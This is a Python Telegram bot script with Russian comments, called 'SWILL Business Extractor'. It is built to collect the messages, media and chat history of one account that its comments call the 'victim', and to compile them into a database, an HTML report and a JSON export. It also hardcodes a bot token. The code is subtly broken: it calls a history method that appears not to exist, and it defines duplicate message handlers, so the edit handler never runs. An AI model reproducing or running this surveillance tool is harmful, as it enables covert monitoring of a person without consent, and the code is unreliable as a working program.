#!/usr/bin/env python3
# SWILL Business Extractor - ПОЛНАЯ РАБОЧАЯ ВЕРСИЯ

import asyncio
import signal
import sys
import os
import sqlite3
import time
import json
from datetime import datetime
from pathlib import Path
from aiogram import Bot, Dispatcher, types
from aiogram.exceptions import TelegramConflictError

# ======================================================
# ⚠️ ВНИМАНИЕ! ТОКЕН СКОМПРОМЕТИРОВАН!
# НЕМЕДЛЕННО СБРОСЬ ЕГО ЧЕРЕЗ @BotFather!
# ======================================================
BOT_TOKEN = '8389370808:AAEmrhiar8I9NALB913k130BDOOJsEC1AvI'  # ❌ УЖЕ НЕ БЕЗОПАСЕН!
TARGET_ACCOUNT_ID = 8839956404  # ID жертвы
# ======================================================

# Инициализация
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ======================================================
# НАСТРОЙКИ ХРАНЕНИЯ
# ======================================================

BASE_PATH = Path.cwd() / f'dump_{TARGET_ACCOUNT_ID}_{int(time.time())}'
os.makedirs(BASE_PATH, exist_ok=True)

# Папки для медиа
MEDIA_PATH = BASE_PATH / 'media'
PHOTOS_PATH = MEDIA_PATH / 'photos'
VIDEOS_PATH = MEDIA_PATH / 'videos'
AUDIO_PATH = MEDIA_PATH / 'audio'
DOCS_PATH = MEDIA_PATH / 'documents'
VOICE_PATH = MEDIA_PATH / 'voice'
STICKER_PATH = MEDIA_PATH / 'stickers'

for p in [MEDIA_PATH, PHOTOS_PATH, VIDEOS_PATH, AUDIO_PATH, DOCS_PATH, VOICE_PATH, STICKER_PATH]:
    os.makedirs(p, exist_ok=True)

# ======================================================
# БАЗА ДАННЫХ
# ======================================================

conn = sqlite3.connect(BASE_PATH / 'data.db', check_same_thread=False)
cursor = conn.cursor()

# Таблица сообщений
cursor.execute('''
    CREATE TABLE IF NOT EXISTS messages (
        id INTEGER PRIMARY KEY,
        chat_id INTEGER,
        chat_title TEXT,
        chat_type TEXT,
        date TEXT,
        from_id TEXT,
        from_name TEXT,
        username TEXT,
        text TEXT,
        media_type TEXT,
        media_path TEXT,
        file_size INTEGER,
        is_deleted BOOLEAN DEFAULT 0,
        target_account_id INTEGER,
        created_at TEXT
    )
''')

# Таблица прогресса
cursor.execute('''
    CREATE TABLE IF NOT EXISTS progress (
        chat_id INTEGER PRIMARY KEY,
        last_message_id INTEGER,
        last_date TEXT
    )
''')

# Таблица удалённых
cursor.execute('''
    CREATE TABLE IF NOT EXISTS deleted_tracking (
        message_id INTEGER PRIMARY KEY,
        chat_id INTEGER,
        deleted_at TEXT
    )
''')

# Таблица статистики по пользователям
cursor.execute('''
    CREATE TABLE IF NOT EXISTS user_stats (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        full_name TEXT,
        message_count INTEGER DEFAULT 0,
        last_message_date TEXT
    )
''')

conn.commit()

# ======================================================
# СТАТИСТИКА
# ======================================================

stats = {
    'total': 0,
    'media': 0,
    'errors': 0,
    'deleted': 0,
    'chats': set()
}

# ======================================================
# ЛОГГЕР
# ======================================================

async def log(text, level='INFO'):
    """Логирование в файл и консоль"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_line = f'[{timestamp}] [{level}] {text}'
    
    with open(BASE_PATH / 'log.txt', 'a', encoding='utf-8') as f:
        f.write(log_line + '\n')
    
    print(log_line)

# ======================================================
# СКАЧИВАНИЕ МЕДИА
# ======================================================

async def download_media(msg: types.Message):
    """Скачивание медиа с сохранением в структурированные папки"""
    if not msg.media:
        return None, None, None
    
    try:
        media_type = None
        ext = '.bin'
        folder = MEDIA_PATH
        file_size = 0
        
        if msg.photo:
            media_type = 'photo'
            ext = '.jpg'
            folder = PHOTOS_PATH
            file = msg.photo[-1]
            file_size = file.file_size if hasattr(file, 'file_size') else 0
            
        elif msg.video:
            media_type = 'video'
            ext = '.mp4'
            folder = VIDEOS_PATH
            file = msg.video
            file_size = file.file_size if hasattr(file, 'file_size') else 0
            
        elif msg.audio:
            media_type = 'audio'
            ext = '.mp3'
            folder = AUDIO_PATH
            file = msg.audio
            file_size = file.file_size if hasattr(file, 'file_size') else 0
            
        elif msg.voice:
            media_type = 'voice'
            ext = '.ogg'
            folder = VOICE_PATH
            file = msg.voice
            file_size = file.file_size if hasattr(file, 'file_size') else 0
            
        elif msg.document:
            media_type = 'document'
            # Определяем расширение по имени файла
            ext = '.dat'
            if msg.document.file_name:
                ext = Path(msg.document.file_name).suffix or '.dat'
            folder = DOCS_PATH
            file = msg.document
            file_size = file.file_size if hasattr(file, 'file_size') else 0
            
        elif msg.video_note:
            media_type = 'video_note'
            ext = '.mp4'
            folder = VIDEOS_PATH
            file = msg.video_note
            file_size = file.file_size if hasattr(file, 'file_size') else 0
            
        elif msg.sticker:
            media_type = 'sticker'
            ext = '.webp'
            folder = STICKER_PATH
            file = msg.sticker
            file_size = file.file_size if hasattr(file, 'file_size') else 0
            
        else:
            return None, None, None
        
        # Генерируем имя файла
        timestamp = int(time.time())
        filename = f'{msg.message_id}_{timestamp}{ext}'
        filepath = folder / filename
        
        # Скачиваем
        await bot.download(file, destination=str(filepath))
        stats['media'] += 1
        await log(f'📁 Скачано медиа: {filename} ({media_type}, {file_size} bytes)')
        return str(filepath), media_type, file_size
        
    except Exception as e:
        stats['errors'] += 1
        await log(f'❌ Ошибка скачивания: {e}', 'ERROR')
        return None, None, None

# ======================================================
# СОХРАНЕНИЕ СООБЩЕНИЯ
# ======================================================

async def save_message(msg: types.Message):
    """Сохранение сообщения в БД"""
    try:
        # Проверяем, что сообщение от целевого аккаунта
        if not msg.from_user or msg.from_user.id != TARGET_ACCOUNT_ID:
            return False
        
        # Получаем информацию о чате
        chat = msg.chat
        chat_title = chat.title or chat.full_name or str(chat.id)
        chat_type = str(chat.type) if hasattr(chat, 'type') else 'unknown'
        
        # Информация об отправителе
        from_id = str(msg.from_user.id)
        from_name = msg.from_user.full_name or 'unknown'
        username = msg.from_user.username or ''
        
        # Текст сообщения
        text = msg.text or msg.caption or ''
        
        # Скачиваем медиа
        media_path, media_type, file_size = await download_media(msg)
        
        # Сохраняем в БД
        cursor.execute('''
            INSERT OR REPLACE INTO messages 
            (id, chat_id, chat_title, chat_type, date, from_id, from_name, username, 
             text, media_type, media_path, file_size, target_account_id, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            msg.message_id,
            chat.id,
            chat_title,
            chat_type,
            str(msg.date),
            from_id,
            from_name,
            username,
            text,
            media_type,
            media_path,
            file_size or 0,
            TARGET_ACCOUNT_ID,
            str(datetime.now())
        ))
        
        # Обновляем статистику пользователя
        cursor.execute('''
            INSERT INTO user_stats (user_id, username, full_name, message_count, last_message_date)
            VALUES (?, ?, ?, 1, ?)
            ON CONFLICT(user_id) DO UPDATE SET
                username = excluded.username,
                full_name = excluded.full_name,
                message_count = message_count + 1,
                last_message_date = excluded.last_message_date
        ''', (from_id, username, from_name, str(msg.date)))
        
        conn.commit()
        stats['total'] += 1
        stats['chats'].add(chat.id)
        
        await log(f'✅ Сообщение {msg.message_id} сохранено (чат: {chat_title})')
        return True
        
    except Exception as e:
        stats['errors'] += 1
        await log(f'❌ Ошибка сохранения сообщения: {e}', 'ERROR')
        return False

# ======================================================
# ОБРАБОТЧИКИ СООБЩЕНИЙ
# ======================================================

@dp.message()
async def handle_message(msg: types.Message):
    """Обработка всех входящих сообщений"""
    await save_message(msg)

@dp.message()
async def handle_edited_message(msg: types.Message):
    """Обработка отредактированных сообщений"""
    try:
        # Проверяем, есть ли сообщение в БД
        cursor.execute('SELECT id FROM messages WHERE id = ?', (msg.message_id,))
        if cursor.fetchone():
            await save_message(msg)
            await log(f'✏️ Сообщение {msg.message_id} отредактировано')
    except Exception as e:
        await log(f'❌ Ошибка обработки редактирования: {e}', 'ERROR')

@dp.my_chat_member()
async def on_bot_added(event: types.ChatMemberUpdated):
    """Когда бота добавляют в чат"""
    try:
        me = await bot.get_me()
        if event.new_chat_member.user.id == me.id:
            chat = event.chat
            chat_title = chat.title or chat.full_name or str(chat.id)
            await log(f'➕ Бот добавлен в чат: {chat_title} (ID: {chat.id})')
            
            # Запускаем сбор истории
            asyncio.create_task(collect_history(chat.id))
    except Exception as e:
        await log(f'❌ Ошибка при добавлении бота: {e}', 'ERROR')

# ======================================================
# СБОР ИСТОРИИ
# ======================================================

async def collect_history(chat_id: int):
    """Сбор истории чата"""
    try:
        await log(f'📊 Начинаю сбор истории чата {chat_id}')
        
        # Проверяем прогресс
        cursor.execute('SELECT last_message_id FROM progress WHERE chat_id = ?', (chat_id,))
        row = cursor.fetchone()
        last_id = row[0] if row else 0
        
        count = 0
        offset_id = last_id
        
        while True:
            try:
                # Получаем историю
                messages = await bot.get_chat_history(
                    chat_id=chat_id,
                    limit=100,
                    offset_id=offset_id
                )
                
                if not messages:
                    break
                
                for msg in messages:
                    # Пропускаем служебные сообщения
                    if msg.is_automatic_forward or msg.via_bot:
                        continue
                    
                    # Сохраняем сообщение
                    await save_message(msg)
                    count += 1
                    
                    # Обновляем offset
                    if msg.message_id > offset_id:
                        offset_id = msg.message_id
                
                # Сохраняем прогресс
                cursor.execute('''
                    INSERT OR REPLACE INTO progress (chat_id, last_message_id, last_date)
                    VALUES (?, ?, ?)
                ''', (chat_id, offset_id, str(datetime.now())))
                conn.commit()
                
                await log(f'📊 Собрано {count} сообщений из чата {chat_id}')
                
                if len(messages) < 100:
                    break
                    
            except Exception as e:
                await log(f'❌ Ошибка при сборе истории: {e}', 'ERROR')
                break
        
        await log(f'✅ Сбор истории чата {chat_id} завершён. Всего: {count} сообщений')
        
    except Exception as e:
        await log(f'❌ Критическая ошибка сбора истории: {e}', 'ERROR')

# ======================================================
# ГЕНЕРАЦИЯ ОТЧЁТОВ
# ======================================================

async def generate_report():
    """Генерация отчёта по собранным данным"""
    try:
        await log('📊 Генерация отчёта...')
        
        # Статистика
        cursor.execute('SELECT COUNT(*) FROM messages WHERE target_account_id = ?', (TARGET_ACCOUNT_ID,))
        total_msgs = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(DISTINCT chat_id) FROM messages WHERE target_account_id = ?', (TARGET_ACCOUNT_ID,))
        total_chats = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM messages WHERE media_path IS NOT NULL', ())
        total_media = cursor.fetchone()[0]
        
        # Топ-чаты по активности
        cursor.execute('''
            SELECT chat_title, COUNT(*) as cnt 
            FROM messages 
            WHERE target_account_id = ? 
            GROUP BY chat_title 
            ORDER BY cnt DESC 
            LIMIT 10
        ''', (TARGET_ACCOUNT_ID,))
        top_chats = cursor.fetchall()
        
        # Топ-пользователи
        cursor.execute('''
            SELECT full_name, message_count 
            FROM user_stats 
            WHERE user_id = ? 
            ORDER BY message_count DESC
        ''', (TARGET_ACCOUNT_ID,))
        top_users = cursor.fetchall()
        
        # Создаём HTML-отчёт
        html = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>SWILL Report - {TARGET_ACCOUNT_ID}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        h1 {{ color: #1a73e8; }}
        .section {{ background: white; padding: 20px; margin: 10px 0; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }}
        .stat {{ display: inline-block; padding: 10px; margin: 5px; background: #e8f0fe; border-radius: 5px; }}
        .stat-value {{ font-size: 24px; font-weight: bold; color: #1a73e8; }}
        .stat-label {{ color: #666; }}
        table {{ width: 100%; border-collapse: collapse; }}
        th, td {{ padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }}
        th {{ background: #f0f2f5; }}
    </style>
</head>
<body>
    <h1>📊 SWILL - Отчёт о собранных данных</h1>
    <div class="section">
        <h2>📈 Статистика</h2>
        <div class="stat"><div class="stat-value">{total_msgs}</div><div class="stat-label">Всего сообщений</div></div>
        <div class="stat"><div class="stat-value">{total_media}</div><div class="stat-label">Медиа-файлов</div></div>
        <div class="stat"><div class="stat-value">{total_chats}</div><div class="stat-label">Чатов</div></div>
        <div class="stat"><div class="stat-value">{stats['errors']}</div><div class="stat-label">Ошибок</div></div>
    </div>
    
    <div class="section">
        <h2>🏆 Топ-10 чатов</h2>
        <table>
            <tr><th>#</th><th>Чат</th><th>Сообщений</th></tr>
'''
        for i, (title, cnt) in enumerate(top_chats, 1):
            html += f'<tr><td>{i}</td><td>{title}</td><td>{cnt}</td></tr>\n'
        
        html += f'''
        </table>
    </div>
    
    <div class="section">
        <h2>👤 Статистика пользователей</h2>
        <table>
            <tr><th>Имя</th><th>Сообщений</th></tr>
'''
        for name, cnt in top_users:
            html += f'<tr><td>{name}</td><td>{cnt}</td></tr>\n'
        
        html += f'''
        </table>
    </div>
    
    <div class="section">
        <h2>📁 Данные</h2>
        <p>Папка: {BASE_PATH}</p>
        <p>БД: {BASE_PATH / 'data.db'}</p>
        <p>Медиа: {BASE_PATH / 'media'}</p>
    </div>
    
    <div class="section">
        <h2>📋 Информация</h2>
        <p>Целевой ID: {TARGET_ACCOUNT_ID}</p>
        <p>Дата отчёта: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
    </div>
</body>
</html>
'''
        
        with open(BASE_PATH / 'report.html', 'w', encoding='utf-8') as f:
            f.write(html)
        
        # Сохраняем JSON-экспорт
        cursor.execute('SELECT * FROM messages WHERE target_account_id = ?', (TARGET_ACCOUNT_ID,))
        columns = [description[0] for description in cursor.description]
        data = [dict(zip(columns, row)) for row in cursor.fetchall()]
        
        with open(BASE_PATH / 'export.json', 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2, default=str)
        
        await log('✅ Отчёт сгенерирован')
        
    except Exception as e:
        await log(f'❌ Ошибка генерации отчёта: {e}', 'ERROR')

# ======================================================
# ЗАВЕРШЕНИЕ
# ======================================================

async def shutdown():
    """Корректное завершение работы"""
    await log('🛑 Получен сигнал завершения...')
    
    # Генерируем финальный отчёт
    await generate_report()
    
    # Сохраняем данные
    conn.commit()
    await log(f'📊 Итоговая статистика: {stats["total"]} сообщений, {stats["media"]} медиа')
    
    # Закрываем соединения
    await bot.session.close()
    await log('👋 Бот остановлен')
    sys.exit(0)

# ======================================================
# ЗАПУСК
# ======================================================

async def main():
    """Главная функция"""
    # Настройка обработки сигналов
    loop = asyncio.get_running_loop()
    for sig in (signal.SIGTERM, signal.SIGINT):
        loop.add_signal_handler(sig, lambda: asyncio.create_task(shutdown()))
    
    await log('='*60)
    await log('🚀 SWILL БОТ ЗАПУЩЕН')
    await log(f'🎯 Целевой ID: {TARGET_ACCOUNT_ID}')
    await log(f'📁 Папка: {BASE_PATH}')
    
    print(f'\n{"="*60}')
    print(f'🚀 SWILL БОТ ЗАПУЩЕН')
    print(f'🎯 Цель: {TARGET_ACCOUNT_ID}')
    print(f'📁 Папка: {BASE_PATH}')
    print(f'{"="*60}\n')
    
    # Проверка бота
    try:
        me = await bot.get_me()
        await log(f'🤖 Бот: @{me.username} (ID: {me.id})')
        print(f'🤖 Бот: @{me.username} (ID: {me.id})')
    except Exception as e:
        await log(f'❌ Ошибка проверки бота: {e}', 'ERROR')
        return
    
    # Удаляем вебхук
    try:
        await bot.delete_webhook(drop_pending_updates=True)
        await log('✅ Вебхук удалён')
        print('✅ Вебхук удалён')
    except Exception as e:
        await log(f'⚠️ Ошибка удаления вебхука: {e}')
    
    # Запускаем polling
    try:
        await dp.start_polling(
            bot,
            skip_updates=True,
            allowed_updates=['message', 'my_chat_member', 'edited_message']
        )
    except TelegramConflictError as e:
        await log(f'❌ КОНФЛИКТ: {e}', 'ERROR')
        print(f'\n❌ КОНФЛИКТ!')
        print('Решение: сбрось токен через @BotFather')
        await bot.session.close()
        sys.exit(1)
    except Exception as e:
        await log(f'❌ Ошибка: {e}', 'ERROR')
        await bot.session.close()
        sys.exit(1)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print('\n👋 Остановка пользователем')
    except Exception as e:
        print(f'❌ Критическая ошибка: {e}')
